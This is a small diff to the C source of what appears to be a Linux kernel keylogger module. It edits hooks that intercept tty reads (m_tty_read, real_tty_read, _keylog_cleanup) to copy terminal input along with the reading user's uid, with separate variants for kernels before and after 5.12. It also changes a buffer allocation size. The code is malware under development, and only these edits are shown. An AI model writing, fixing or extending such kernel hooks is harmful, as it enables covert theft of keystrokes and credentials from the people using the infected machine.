@@ -788,8 +788,7 @@ void _keylog_cleanup(void) {
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,12,0)
 static ssize_t  (*real_tty_read)(struct file *, char __user *, size_t, loff_t *);
-static ssize_t __attribute__((unused))
-    m_tty_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
+static ssize_t m_tty_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
 #else
 static ssize_t  (*real_tty_read)(struct kiocb *iocb, struct iov_iter *to);
 static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
@@ -806,7 +805,7 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
     if (rv <= 0)
         goto out;
 
-    ttybuf = kzalloc(rv+2, GFP_KERNEL);
+    ttybuf = kzalloc(rv+1, GFP_KERNEL);
     if (ttybuf) {
         char byte;
         uid_t uid;
